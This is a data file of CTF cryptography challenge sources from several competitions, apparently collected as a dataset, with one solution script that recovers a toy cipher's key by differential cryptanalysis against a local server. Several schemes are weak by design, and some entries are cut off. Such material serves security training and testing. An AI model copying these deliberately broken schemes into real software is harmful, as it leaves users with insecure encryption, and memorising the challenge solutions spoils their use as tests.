bit(h,i) for i in range(3,b-2))\n  A = scalarmult(B,a)\n  return encodepoint(A)\n\ndef Hint(m):\n  h = H(m)\n  return sum(2**i * bit(h,i) for i in range(2*b))\n\ndef signature(m,sk,pk):\n  h = H(sk)\n  a = 2**(b-2) + sum(2**i * bit(h,i) for i in range(3,b-2))\n  r = Hint(''.join([h[i] for i in range(b//8,b//4)]) + m)\n  R = scalarmult(B,r)\n  S = (r + Hint(encodepoint(R) + pk + m) * a) % l\n  return encodepoint(R) + encodeint(S)\n\ndef isoncurve(P):\n  x = P[0]\n  y = P[1]\n  return (-x*x + y*y - 1 - d*x*x*y*y) % q == 0\n\ndef decodeint(s):\n  return sum(2**i * bit(s,i) for i in range(0,b))\n\ndef decodepoint(s):\n  y = sum(2**i * bit(s,i) for i in range(0,b-1))\n  x = xrecover(y)\n  if x & 1 != bit(s,b-1): x = q-x\n  P = [x,y]\n  #if not isoncurve(P): raise Exception(\"decoding point that is not on curve\")\n  return P\n\n\ndef decodepointcheck(s):\n  y = sum(2**i * bit(s,i) for i in range(0,b-1))\n  x = xrecover(y)\n  if x & 1 != bit(s,b-1): x = q-x\n  P = [x,y]\n  #print(\"actually checking if it's on curve!\")\n  if not isoncurve(P): \n      #print(\"not on curve\")\n      quit() \n      raise Exception(\"decoding point that is not on curve\")\n  return P\n\n\ndef checkvalid(s,m,pk):\n  if len(s) != b//4: \n    raise Exception(\"signature length is wrong\")\n    return False\n  if len(pk) != b//8: \n    raise Exception(\"public-key length is wrong\")\n    return False\n  R = decodepoint(s[0:b//8])\n  A = decodepoint(pk)\n  S = decodeint(s[b//8:b//4])\n  h = Hint(encodepoint(R) + pk + m)\n  if scalarmult(B,S) != edwards(R,scalarmult(A,h)):\n    raise Exception(\"signature does not pass verification\")\n    return False\n  return True\n", "name": "ed25519"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ecsc2023-irish-flan\\release_files\\irish_flan.py", "category": "crypto", "solution_code": "import hashlib\nimport secrets\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.number import getPrime\nfrom Crypto.Util.Padding import pad\n\n\ndef Z(M):\n    class R:\n        def __init__(self, r):\n            self.r = r % M\n\n        def __add__(self, other):\n            return R(self.r + other.r)\n\n        def __sub__(self, other):\n            return R(self.r - other.r)\n\n        def __neg__(self):\n            return R(-self.r)\n\n        def __mul__(self, other):\n            if isinstance(other, int):\n                return R(self.r * other)\n            return R(self.r * other.r)\n\n        def __pow__(self, other):\n            return R(pow(self.r, other, M))\n\n        def __truediv__(self, other):\n            return self * other**-1\n\n        def __repr__(self):\n            return f\"Z({repr(M)})({repr(self.r)})\"\n\n        def __str__(self):\n            return f\"{self.r} (mod {M})\"\n    return R\n\n\nclass Q:\n    def __init__(self, a, b, c, d):\n        self.a = a\n        self.b = b\n        self.c = c\n        self.d = d\n\n    def __add__(self, other):\n        return Q(self.a + other.a, self.b + other.b,\n                 self.c + other.c, self.d + other.d)\n\n    def __sub__(self, other):\n        return Q(self.a - other.a, self.b - other.b,\n                 self.c - other.c, self.d - other.d)\n\n    def __mul__(self, o):\n        if isinstance(o, (int, type(self.a))):\n            return Q(self.a * o, self.b * o,\n                     self.c * o, self.d * o)\n        return Q(self.a * o.a - self.b * o.b - self.c * o.c - self.d * o.d,\n                 self.a * o.b + self.b * o.a + self.c * o.d - self.d * o.c,\n                 self.a * o.c - self.b * o.d + self.c * o.a + self.d * o.b,\n                 self.a * o.d + self.b * o.c - self.c * o.b + self.d * o.a\n                 )\n\n    def __pow__(self, other):\n        if other < 0:\n            return self.invert()**-other\n        res = Q(*map(type(self.a), [1, 0, 0, 0]))\n        c = self\n        while other:\n            if other & 1:\n                res = res * c\n            other >>= 1\n            c = c * self\n        return res\n\n    def invert(self):\n        d = (self.a**2 + self.b**2 + self.c**2 + self.d**2)\n        return Q(self.a/d, -self.b/d, -self.c/d, -self.d/d)\n\n    def __repr__(self):\n        return \"Q({},{},{},{})\".format(*map(repr,\n                                       [self.a, self.b, self.c, self.d]))\n\n    def __str__(self):\n        return \"({})\".format(\",\".join(\n                             map(str, [self.a, self.b, self.c, self.d])))\n\n\nclass Dessert:\n    def __init__(self):\n        self.n = getPrime(1024) * getPrime(1024)\n        self.R = Z(self.n)\n        r = secrets.randbelow(self.n**8)\n        self.Ï‡ = Q(*[self.R(secrets.randbelow(self.n)) for _ in \"abcd\"])\n        self.Î± = Q(*[self.R(secrets.randbelow(self.n)) for _ in \"abcd\"])\n        self.Î² = self.Ï‡**-1 * self.Î±**-1 * self.Ï‡\n        self.Î³ = self.Ï‡**r\n\n    @property\n    def pub(self):\n        return (self.n,\n                self.Î±,\n                self.Î²,\n                self.Î³)\n\n    def encrypt(self, m):\n        k = Q(*[self.R(secrets.randbelow(self.n)) for _ in \"abcd\"])\n        K = hashlib.sha256(str(k).encode()).digest()\n        c = AES.new(K, AES.MODE_CBC, iv=b\"\\0\" * 16).encrypt(pad(m, 16))\n        s = secrets.randbelow(self.n**8)\n        Î´ = self.Î³**s\n        Îµ = Î´**-1 * self.Î± * Î´\n        Îº = Î´**-1 * self.Î² * Î´\n        Î¼ = Îº * k * Îº\n        return (c, Î¼, Îµ)\n\n\nif __name__ == \"__main__\":\n    flan = Dessert()\n    print(\"Public key:\", \",\".join(map(str, flan.pub)))\n    with open(\"flag.txt\") as f:\n        print(\"Encryption:\", \",\".join(\n              map(str, flan.encrypt(f.read().strip().encode()))))\n", "name": "irish_flan"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\DCTF2022_key_recovery\\release_files\\key_recovery.py", "category": "crypto", "solution_code": "../server_files/key_recovery.py", "name": "key_recovery"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\DCTF2022_key_recovery\\server_files\\key_recovery.py", "category": "crypto", "solution_code": "import os\nfrom hashlib import sha512\n\nFLAG = os.environ.get(\"FLAG\")\n\nBS = 16\nR = 3\n\nS_box = [80, 12, 233, 22, 60, 179, 30, 32, 112, 114, 174, 83, 207, 107, 33, 237, 37, 121, 161, 50, 54, 57, 77, 59, 152, 53, 52, 204, 70, 104, 163, 68, 196, 189, 17, 211, 178, 220, 92, 137, 78, 29, 96, 103, 239, 213, 108, 109, 111, 113, 90, 162, 21, 120, 23, 157, 123, 195, 186, 205, 132, 236, 232, 145, 248, 85, 134, 135, 139, 140, 102, 144, 249, 147, 181, 130, 194, 154, 175, 183, 219, 28, 66, 202, 91, 116, 142, 106, 9, 188, 203, 117, 206, 208, 151, 242, 82, 14, 210, 217, 20, 221, 227, 10, 99, 156, 160, 241, 67, 126, 65, 45, 231, 191, 46, 71, 58, 245, 24, 235, 218, 253, 61, 64, 79, 192, 8, 63, 3, 122, 35, 7, 81, 38, 201, 40, 252, 118, 254, 133, 177, 73, 34, 13, 180, 76, 4, 62, 15, 110, 165, 246, 100, 98, 89, 55, 250, 56, 47, 86, 72, 143, 173, 131, 223, 39, 115, 222, 166, 1, 148, 16, 74, 51, 200, 146, 95, 6, 36, 128, 69, 184, 155, 153, 31, 216, 215, 88, 2, 240, 187, 11, 167, 212, 164, 43, 214, 171, 49, 244, 243, 0, 209, 44, 197, 172, 251, 84, 170, 198, 168, 149, 75, 26, 136, 119, 230, 225, 255, 42, 228, 125, 185, 229, 124, 25, 93, 224, 5, 158, 226, 87, 101, 129, 176, 159, 169, 193, 48, 247, 234, 182, 41, 238, 94, 105, 18, 97, 141, 199, 150, 127, 138, 27, 19, 190]\nS_box_inv = [201, 169, 188, 128, 146, 228, 177, 131, 126, 88, 103, 191, 1, 143, 97, 148, 171, 34, 246, 254, 100, 52, 3, 54, 118, 225, 213, 253, 81, 41, 6, 184, 7, 14, 142, 130, 178, 16, 133, 165, 135, 242, 219, 195, 203, 111, 114, 158, 238, 198, 19, 173, 26, 25, 20, 155, 157, 21, 116, 23, 4, 122, 147, 127, 123, 110, 82, 108, 31, 180, 28, 115, 160, 141, 172, 212, 145, 22, 40, 124, 0, 132, 96, 11, 207, 65, 159, 231, 187, 154, 50, 84, 38, 226, 244, 176, 42, 247, 153, 104, 152, 232, 70, 43, 29, 245, 87, 13, 46, 47, 149, 48, 8, 49, 9, 166, 85, 91, 137, 215, 53, 17, 129, 56, 224, 221, 109, 251, 179, 233, 75, 163, 60, 139, 66, 67, 214, 39, 252, 68, 69, 248, 86, 161, 71, 63, 175, 73, 170, 211, 250, 94, 24, 183, 77, 182, 105, 55, 229, 235, 106, 18, 51, 30, 194, 150, 168, 192, 210, 236, 208, 197, 205, 162, 10, 78, 234, 140, 36, 5, 144, 74, 241, 79, 181, 222, 58, 190, 89, 33, 255, 113, 125, 237, 76, 57, 32, 204, 209, 249, 174, 134, 83, 90, 27, 59, 92, 12, 93, 202, 98, 35, 193, 45, 196, 186, 185, 99, 120, 80, 37, 101, 167, 164, 227, 217, 230, 102, 220, 223, 216, 112, 62, 2, 240, 119, 61, 15, 243, 44, 189, 107, 95, 200, 199, 117, 151, 239, 64, 72, 156, 206, 136, 121, 138, 218]\nP_nib = [0, 4, 8, 12, 1, 5, 9, 13, 2, 6, 10, 14, 3, 7, 11, 15]\nP_box = [24, 19, 12, 25, 0, 9, 6, 31, 26, 11, 28, 5, 14, 13, 20, 15, 18, 21, 10, 27, 4, 1, 22, 3, 8, 17, 16, 29, 2, 23, 30, 7]\nP_box_inv = [4, 21, 28, 23, 20, 11, 6, 31, 24, 5, 18, 9, 2, 13, 12, 15, 26, 25, 16, 1, 14, 17, 22, 29, 0, 3, 8, 19, 10, 27, 30, 7]\n\nmenu = \"\"\"What do you want to do?\n1 - Encrypt\n2 - Decrypt\n3 - Get flag\n> \"\"\"\n\nxor = lambda a,b: bytes(x^y for x,y in zip(a,b))\n\ndef nib_to_byte(x):\n    return bytes([x[i]*16 + x[i+1] for i in range(0,len(x), 2)])\n\ndef byte_to_nib(x):\n    out = []\n    for b in x:\n        out.append(b//16)\n        out.append(b%16)\n    return out\n\n\ndef key_schedule(k):\n    k += sha512(k).digest()\n    return [k[i:i+BS] for i in range(0,(R+1)*BS, BS)]\n\ndef sub(x):\n    return bytes([S_box[a] for a in x])\n\ndef sub_inv(x):\n    return bytes([S_box_inv[a] for a in x])\n\ndef per(x):\n    x = byte_to_nib(x)\n    x = [P_nib[x[P_box[i]]] for i in range(32)]\n    return nib_to_byte(x)\n\ndef per_inv(x):\n    x = byte_to_nib(x)\n    x = [P_nib[x[P_box_inv[i]]] for i in range(32)]\n    return nib_to_byte(x)\n\ndef block(x, keys):\n    for r in range(R):\n        x = sub(x)\n        x = xor(x, keys[r])\n        x = per(x)\n\n    x = sub(x)\n    x = xor(x, keys[R])\n\n    return x\n\ndef block_inv(x, keys):\n    x = xor(x, keys[R])\n    x = sub_inv(x)\n\n    for i in range(R-1, -1, -1):\n        x = per_inv(x)\n        x = xor(x, keys[i])\n        x = sub_inv(x)\n\n    return x\n\ndef enc(k, pt):\n    s = key_schedule(k)\n    l = len(pt)\n    if l % BS:\n        pt += b\"\\0\" * (BS - (l % BS))\n    return b\"\".join([block(pt[i:i+BS], s) for i in range(0, l, BS)])\n\ndef dec(k, ct):\n    s = key_schedule(k)\n    l = len(ct)\n    return b\"\".join([block_inv(ct[i:i+BS], s) for i in range(0, l, BS)])\n\ndef main():\n    cnt = 0\n    K = os.urandom(BS)\n    print(\"I bet you can't recover my key, so I made a game for you. You shouldn't need more than 3000 blocks.\")\n\n    while True:\n        print(menu, end=\"\")\n        op = input()\n        if op == \"1\":\n            print(\"Send me the text you want to encrypt in hex format:\")\n            pt = bytes.fromhex(input())\n            cnt += (len(pt) + BS - 1) // BS\n            if cnt > 3000:\n                print(\"You can't encrypt that much. Goodbye!\")\n                break\n            ct = enc(K, pt)\n            print(\"Here you go: \", ct.hex())\n        elif op == \"2\":\n            print(\"Send me the text you want to decrypt in hex format:\")\n            ct = bytes.fromhex(input())\n            l = len(ct)\n            if l % BS:\n                pr", "name": "key_recovery"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\DCTF2022_key_recovery\\server_files\\solution.py", "category": "crypto", "solution_code": "import os\nfrom hashlib import sha512\nfrom pwn import remote, xor\n\nHOST = \"127.0.0.1\"\nPORT = 1337\n\nio = remote(HOST, PORT)\n\nBS = 16\nR = 3\n\nS_box_inv = [201, 169, 188, 128, 146, 228, 177, 131, 126, 88, 103, 191, 1, 143, 97, 148, 171, 34, 246, 254, 100, 52, 3, 54, 118, 225, 213, 253, 81, 41, 6, 184, 7, 14, 142, 130, 178, 16, 133, 165, 135, 242, 219, 195, 203, 111, 114, 158, 238, 198, 19, 173, 26, 25, 20, 155, 157, 21, 116, 23, 4, 122, 147, 127, 123, 110, 82, 108, 31, 180, 28, 115, 160, 141, 172, 212, 145, 22, 40, 124, 0, 132, 96, 11, 207, 65, 159, 231, 187, 154, 50, 84, 38, 226, 244, 176, 42, 247, 153, 104, 152, 232, 70, 43, 29, 245, 87, 13, 46, 47, 149, 48, 8, 49, 9, 166, 85, 91, 137, 215, 53, 17, 129, 56, 224, 221, 109, 251, 179, 233, 75, 163, 60, 139, 66, 67, 214, 39, 252, 68, 69, 248, 86, 161, 71, 63, 175, 73, 170, 211, 250, 94, 24, 183, 77, 182, 105, 55, 229, 235, 106, 18, 51, 30, 194, 150, 168, 192, 210, 236, 208, 197, 205, 162, 10, 78, 234, 140, 36, 5, 144, 74, 241, 79, 181, 222, 58, 190, 89, 33, 255, 113, 125, 237, 76, 57, 32, 204, 209, 249, 174, 134, 83, 90, 27, 59, 92, 12, 93, 202, 98, 35, 193, 45, 196, 186, 185, 99, 120, 80, 37, 101, 167, 164, 227, 217, 230, 102, 220, 223, 216, 112, 62, 2, 240, 119, 61, 15, 243, 44, 189, 107, 95, 200, 199, 117, 151, 239, 64, 72, 156, 206, 136, 121, 138, 218]\nP_nib = [0, 4, 8, 12, 1, 5, 9, 13, 2, 6, 10, 14, 3, 7, 11, 15]\nP_box_inv = [4, 21, 28, 23, 20, 11, 6, 31, 24, 5, 18, 9, 2, 13, 12, 15, 26, 25, 16, 1, 14, 17, 22, 29, 0, 3, 8, 19, 10, 27, 30, 7]\n\ndef nib_to_byte(x):\n    return bytes([x[i]*16 + x[i+1] for i in range(0,len(x), 2)])\n\ndef byte_to_nib(x):\n    out = []\n    for b in x:\n        out.append(b//16)\n        out.append(b%16)\n    return out\n\ndef key_schedule(k):\n    k += sha512(k).digest()\n    return [k[i:i+BS] for i in range(0,(R+1)*BS, BS)]\n\ndef sub_inv(x):\n    return bytes([S_box_inv[a] for a in x])\n\ndef per_inv(x):\n    x = byte_to_nib(x)\n    x = [P_nib[x[P_box_inv[i]]] for i in range(32)]\n    return nib_to_byte(x)\n\n\n\ndef send(op, payload):\n    io.sendlineafter(b\">\", op)\n    io.sendlineafter(b\":\\n\", payload.hex())\n    tmp = io.recvline().decode().strip().split()[-1]\n    return tmp\n\ndef prepare_pairs(n, a):\n    pairs = []\n    for _ in range(n):\n        try:\n            x = os.urandom(16)\n            k = send(\"1\",x)\n            y = unhex(k)\n            x_a = xor(x, a)\n            k_a = send(\"1\",x_a)\n            y_a = unhex(k_a)\n            pairs.append((y,y_a))\n        except:\n            print(k,k_a)\n            exit()\n    return pairs\n\nmask = b'\\xbe\\xbe\\xbe\\xbe\\xbe\\xbe\\xbe\\xbe\\xbe\\xbe\\xbe\\xbe\\xbe\\xbe\\xbe\\xbe'\n\npairs = prepare_pairs(1499, mask)\n\ndef get_key(pairs):\n    for i in range(R+1):\n        key = []\n\n        for j in range(16):\n            candidates = [0] * 256\n            for pair in pairs:\n                y  = pair[0][j]\n                y_ = pair[1][j]\n                \n                for k in range(256):\n                    xor_y = y ^ k\n                    xor_y_ = y_ ^ k\n                    rev_y = S_box_inv[xor_y]\n                    rev_y_ = S_box_inv[xor_y_]\n                    if rev_y ^ rev_y_ == mask[j]:\n                        candidates[k] += 1\n            key.append(candidates.index(max(candidates)))\n\n        for i in range(len(pairs)):\n            x,y = pairs[i]\n            x = xor(x, key)\n            x = sub_inv(x)\n            x = per_inv(x)\n            y = xor(y, key)\n            y = sub_inv(y)\n            y = per_inv(y)\n            pairs[i] = (x,y)\n        print(bytes(key))\n    return bytes(key)\n\nkey = get_key(pairs)\nprint(send(\"3\",key))", "name": "solution"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\cyber-apocalypse-2025-verilicious\\release_files\\source.py", "category": "crypto", "solution_code": "from Crypto.Cipher import PKCS1_v1_5\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Util.number import getPrime, long_to_bytes as l2b, bytes_to_long as b2l\nfrom random import seed, randbytes\nfrom data import R, s\n\nseed(s)\n\nclass Verilicious:\n    def __init__(self):\n        self.key = RSA.import_key(open('privkey.pem', 'rb').read())\n        self.cipher = PKCS1_v1_5.new(self.key, randbytes)\n\n    def verify(self, c):\n        c = b'\\x00'*(self.key.n.bit_length()//8-len(c)) + c\n        return int(self.cipher.decrypt(c, sen := get_random_bytes(self.key.n.bit_length()//8)) != sen)\n\n    def encrypt(self, m):\n        return self.cipher.encrypt(m)\n\nver = Verilicious()\n\nenc_flag = ver.encrypt(open('flag.txt', 'rb').read()).hex()\n\nassert all(ver.verify(l2b(pow(r, ver.key.e, ver.key.n) * int(enc_flag, 16) % ver.key.n)) for r in R)\n\nimport os ; os.system('openssl rsa -in privkey.pem -pubout -out pubkey.pem')\n\nwith open('output.txt', 'w') as f:\n    f.write(f'{enc_flag = }\\n')\n    f.write(f'{R = }\\n')\n", "name": "source"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\cscbe2024-additional-problems\\release_files\\server.py", "category": "crypto", "solution_code": "../server_files/server.py", "name": "server"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\cscbe2024-additional-problems\\server_files\\server.py", "category": "crypto", "solution_code": "import Crypto.Util.number # Ensure all our RNGs are safe!!\nimport random # This is only used for the noise and not for the key, so it's fine\nimport binascii\nimport os\n\nFLAG = os.getenv('FLAG')\n\ndef dghv_encrypt(p, N, m):\n    \"\"\"\n    Encrypt a value to later decrypt with `dghv_decrypt`\n    \"\"\"\n    assert 2**7 <= N < 2**8 # Normally this is 2, but by using a bigger `N` we can encode ASCII bytes instead of bits! That's much more efficient. All `N` in this range should be secure, so let's make it an assertion\n\n    q = random.getrandbits(1024)\n    rmax = 2**128 / N / 4\n    r = random.randint(0, rmax) # In v2.0, we will let `r` be negative as well as positive => double the randomness!\n    return p*q + N*r + m\n\ndef dghv_decrypt(p, N, c):\n    \"\"\"\n    Since c = pq + Nr + m, we can find m as (c mod p) mod N!\n    \"\"\"\n    return (c % p) % N\n\ndef dghv_add(c1, c2):\n    \"\"\"\n    The sum of ciphertexts decodes to the sum of plaintexts!!!\n    \"\"\"\n    return c1 + c2 # We will add bootstrapping to make this fully homomorphic in v2.0\n\ndef dghv_multiply(c1, c2):\n    raise NotImplementedError # We will add multiplication in v2.0\n\ndef serialize(s):\n    res = binascii.hexlify(s).decode()\n    return ' '.join([res[i:i+2] for i in range(0, len(res), 2)])\n\ndef deserialize(s):\n    return binascii.unhexlify(s)\n\n\ndef Game(client_socket):\n    GameStatus = True\n\n    output(client_socket, \"Welcome! We're glad you're trying out our free and secure encryption service.\\n\\nYou're currently on v1.0. This is only the beginning -- v2.0 will bring extra features and security fixes and v3.0 will add AI, probably.\\n\")\n    while True:\n        p = Crypto.Util.number.getPrime(128) # VERY IMPORTANT!!! THIS MUST BE COPRIME WITH ALL N!!! So let's just make it prime to be sure :-)\n\n        output(client_socket, \"We've generated a private key, it's like super secure!\")\n        output(client_socket, \"We've even encrypted our secret flag with it:\")\n        output(client_socket, \"\\n\".join(map(lambda c: \"  \" + str(dghv_encrypt(p, 2**7, ord(c))), FLAG)))\n        output(client_socket, \"\")\n        output(client_socket, \"Now you get to encrypt and decrypt stuff. You can try out the killer feature: if you encrypt two strings, add them, and decrypt them, you get the sum of the strings! Have fun!!\")\n        output(client_socket, \"\")\n\n        first_iter = True\n        while True:\n            if first_iter:\n                first_iter = False\n                action = \"new\"\n            else:\n                while True:\n                    output(client_socket, \"What do you want to do?\\n   (1) Start a new encryption\\n   (2) Encrypt and add to the current encrypted value\\n   (3) Decrypt the current encrypted value\\n     > \", newline=False)\n                    choice = client_socket.recv(1024).decode().strip()\n                    if choice == '1':\n                        action = \"new\"\n                        break\n                    elif choice == '2':\n                        action = \"add\"\n                        break\n                    elif choice == '3':\n                        action = \"decrypt\"\n                        break\n                    else:\n                        output(client_socket, \"Invalid option :(\")\n\n            if action == \"new\":\n                while True:\n                    output(client_socket, \"Choose N: \", newline=False)\n                    try:\n                        N = client_socket.recv(1024).decode().strip()\n                        N = int(N)\n                        assert 2**7 <= N < 2**8\n                        break\n                    except Exception as e: output(client_socket, f\"Invalid option :( Error: {e}\")\n            if action == \"new\" or action == \"add\":\n                while True:\n                    output(client_socket, \"Message to encode (converted to hexadecimal): \", newline=False)\n                    try:\n                        m = deserialize(client_socket.recv(1024).decode().strip().replace(' ', ''))\n                        lnew = len(m)\n                        if any([char >= N for char in m]):\n                            output(client_socket, f\"Invalid input: message bytes cannot be larger than N!\")\n                            continue\n\n                        if action == \"add\": \n                            assert lnew == l\n                        else:\n                            l = lnew\n                            c = [0 for _ in range(l)]\n                        break\n                    except Exception as e: output(client_socket, f\"Invalid option :( Error: {e}\")\n                c = [dghv_add(c[i], dghv_encrypt(p, N, m[i])) for i in range(l)]\n            elif action == \"decrypt\":\n                output(client_socket, \"Decrypted message: \" + serialize(bytes([dghv_decrypt(p, N, c[i]) for i in range(l)])))\n            else:\n                pass\n    client_socket.close()\n\ndef output(client_socket, s, newline=True):\n    client_socket\n    client_socket.sendall(bytes(s + (\"\\n\" if newline else \"\"), \"utf-8\"))\n\n# --- TEC", "name": "server"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\CODEGATE2024_Greatest_Common_Multiple\\release_files\\chall.py", "category": "crypto", "solution_code": "from Crypto.Cipher import AES\nfrom os import urandom\nfrom signal import alarm\nfrom secret import PoW, flag\n\nPoW(26)\nalarm(20)\n\ngen = lambda: urandom(12)\nrandbit = lambda: gen()[0] & 1\n\nkey, nonce = urandom(16), gen()\n\nnew = lambda: AES.new(key, AES.MODE_GCM, nonce)\ns = [gen(), gen()]\n\nwhile cmd := input(\"> \"):\n\tif cmd == \"tag\":\n\t\tcipher = new()\n\t\tcipher.update(s[0])\n\t\tcipher.encrypt(s[1])\n\t\tprint(f\"tag: {cipher.digest().hex()}\")\n\n\telif cmd == \"u1\":\n\t\ts[randbit()] = gen()\n\n\telif cmd == \"u2\":\n\t\ts[randbit()] += gen()\n\nif input(f\"tag: \") == new().digest().hex():\n\tprint(flag)\n", "name": "chall"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\CODEGATE2024_Greatest_Common_Multiple\\server_files\\src\\chall.py", "category": "crypto", "solution_code": "from Crypto.Cipher import AES\nfrom os import urandom\nfrom signal import alarm\nfrom secret import PoW, flag\n\nPoW(26)\nalarm(20)\n\ngen = lambda: urandom(12)\nrandbit = lambda: gen()[0] & 1\n\nkey, nonce = urandom(16), gen()\n\nnew = lambda: AES.new(key, AES.MODE_GCM, nonce)\ns = [gen(), gen()]\n\nwhile cmd := input(\"> \"):\n\tif cmd == \"tag\":\n\t\tcipher = new()\n\t\tcipher.update(s[0])\n\t\tcipher.encrypt(s[1])\n\t\tprint(f\"tag: {cipher.digest().hex()}\")\n\n\telif cmd == \"u1\":\n\t\ts[randbit()] = gen()\n\n\telif cmd == \"u2\":\n\t\ts[randbit()] += gen()\n\nif input(f\"tag: \") == new().digest().hex():\n\tprint(flag)\n", "name": "chall"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\CODEGATE2024_Greatest_Common_Multiple\\server_files\\src\\secret.py", "category": "crypto", "solution_code": "import hashlib\nimport os\nimport random\nimport string\n\ncolors = ['\\033[94m', '\\033[96m', '\\033[95m']\nreset = '\\033[0m'\n\nbanner = ''.join(random.choice(colors) + char + reset if char != ' ' else char for char in open(\"banner.txt\", \"r\").read())\n\n\ncolors = [\"\\033[0;32m\", \"\\033[0;33m\", \"\\033[0;34m\", \"\\033[0;35m\", \"\\033[0;36m\", \"\\033[0;37m\", \"\\033[0;31m\", \"\\033[38;5;248m\", \"\\033[0m\"]\ngreen, yellow, blue, purple, cyan, white, red, grey, reset = colors\n\nflag = \"\"\n\nfor c in open(\"flag.txt\", \"r\").read(): flag += colors[random.randrange(0, 6)] + c\nflag += reset\n\ndef PoW(bits):\n\tprint(banner)\n\tn = random.randrange(0, 2**bits)\n\ta = \"\".join(random.choices(string.ascii_letters, k=20)).encode()\n\thsh = hashlib.md5(str(n).encode() + a).digest()\n\n\tprint(f\"md5(str(n).encode() + {a}).hexdigest() = {bytes.hex(hsh)}\")\n\tif int(input(f\"Input the decimal result of n within range(2**{bits}): \")) != n:\n\t\texit()\n", "name": "secret"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\CODEGATE2022_Dark_Arts\\release_files\\chal.py", "category": "crypto", "solution_code": "import os\nimport hashlib \nimport signal \n\nsignal.alarm(300)\n\ndef inner_product(u, v):\n    assert len(u) == len(v)\n    res = 0\n    for a, b in zip(u, v):\n        res += a * b\n    return res\n\ndef guess_mode(G):\n    while True:\n        idx = int(input())\n        if idx == 0:\n            x = int(input())\n            print(G.calc(x))\n        elif idx == 1:\n            mode = int(input())\n            if mode != G.mode:\n                exit()\n            else:\n                break\n        else:\n            exit()\n\ndef guess_key(G, l):\n    while True:\n        idx = int(input())\n        if idx == 0:\n            x = int(input())\n            print(G.func_gen(x))\n        elif idx == 1:\n            for i in range(l):\n                x = int(input())\n                if x != G.key[i]:\n                    exit()\n            break\n        else:\n            exit()\n\nclass Generator1:\n    def __init__(self):\n        seed = int.from_bytes(os.urandom(32), \"big\")\n        self.key = [0] * 256\n        for i in range(256):\n            self.key[i] = (seed >> i) & 1\n        self.mode = os.urandom(1)[0] & 1\n        \n        self.p = 2\n        self.q = 3\n\n        self.cache0 = {}\n        self.cache1 = {}\n        \n    def func_gen(self, x):\n        assert 0 <= x < (1 << 256)\n        if x in self.cache0.keys():\n            return self.cache0[x]\n        arr = [0] * 256\n        for i in range(256):\n            arr[i] = (x >> i) & 1\n        prod = inner_product(self.key, arr)\n        self.cache0[x] = (prod % self.p + prod % self.q) % self.p\n        return self.cache0[x]\n    \n    def func_random(self, x):\n        assert 0 <= x < (1 << 256)\n        if x in self.cache1.keys():\n            return self.cache1[x]\n        self.cache1[x] = os.urandom(1)[0] & 1\n        return self.cache1[x]\n    \n    def calc(self, x):\n        ret0 = self.func_gen(x)\n        ret1 = self.func_random(x)\n        if self.mode == 0:\n            return ret0\n        else:\n            return ret1\n\ndef challenge_generator_1():\n    print(\"Challenge 1\")\n    for _ in range(64):\n        G = Generator1()\n        guess_mode(G)\n\nclass Generator2:\n    def __init__(self):\n        seed = int.from_bytes(os.urandom(32), \"big\")\n        self.key = [0] * 256\n        for i in range(256):\n            self.key[i] = (seed >> i) & 1\n        self.mode = os.urandom(1)[0] & 1\n        \n        self.p = 5\n        self.q = 7\n\n        self.cache0 = {}\n        self.cache1 = {}\n    \n    def func_gen(self, x):\n        x = int.from_bytes(hashlib.sha256(str(x).encode()).digest(), \"big\")\n        if x in self.cache0.keys():\n            return self.cache0[x]\n        hashed = [0] * 256\n        for i in range(256):\n            hashed[i] = (x >> i) & 1\n        prod = inner_product(self.key, hashed)\n        self.cache0[x] = (prod % self.p + prod % self.q) % self.p\n        return self.cache0[x]\n    \n    def func_random(self, x):\n        x = int.from_bytes(hashlib.sha256(str(x).encode()).digest(), \"big\")\n        if x in self.cache1.keys():\n            return self.cache1[x]\n        self.cache1[x] = int.from_bytes(os.urandom(32), \"big\") % self.p\n        return self.cache1[x]\n    \n    def calc(self, x):\n        ret0 = self.func_gen(x)\n        ret1 = self.func_random(x)\n        if self.mode == 0:\n            return ret0\n        else:\n            return ret1\n\ndef challenge_generator_2():\n    print(\"Challenge 2\")\n    for _ in range(64):\n        G = Generator2()\n        guess_mode(G)\n\nclass Generator3:\n    def __init__(self):\n        seed = int.from_bytes(os.urandom(16), \"big\")\n        self.key = [0] * 64\n        for i in range(64):\n            self.key[i] = seed & 3\n            seed = seed >> 2\n\n        self.p = 2\n        self.q = 5\n    \n    def func_gen(self, x):\n        x = int.from_bytes(hashlib.sha256(str(x).encode()).digest(), \"big\")\n        hashed = [0] * 64\n        for i in range(64):\n            hashed[i] = x % self.q\n            x = x // self.q\n        prod = inner_product(self.key, hashed)\n        return (prod % self.q) % self.p\n\ndef challenge_generator_3():\n    print(\"Challenge 3\")\n    G = Generator3()\n    guess_key(G, 64)\n\nclass Generator4:\n    def __init__(self):\n        self.key = [0] * 16\n        for i in range(16):\n            self.key[i] = int.from_bytes(os.urandom(32), \"big\")\n\n        self.p = int.from_bytes(os.urandom(32), \"big\") + (1 << 256)\n        self.q = int.from_bytes(os.urandom(16), \"big\") + (1 << 128)\n        \n        print(self.p)\n        print(self.q)\n    \n    def func_gen(self, x):\n        x = hashlib.sha256(str(x).encode()).digest()\n        hashed = []\n        for _ in range(16):\n            hashed.append(int.from_bytes(x, \"big\"))\n            x = hashlib.sha256(x).digest()\n        prod = inner_product(self.key, hashed)\n        return (prod % self.p + prod % self.q) % self.p\n\ndef challenge_generator_4():\n    print(\"Challenge 4\")\n    G = Generator4()\n    guess_key(G, 16)\n\nchallenge_generator_1()\nchallenge_generator_2()\nchallenge_generator_3()\nchallenge_generator_4()\n\nflag = os.environ.get(\"FLA", "name": "chal"}
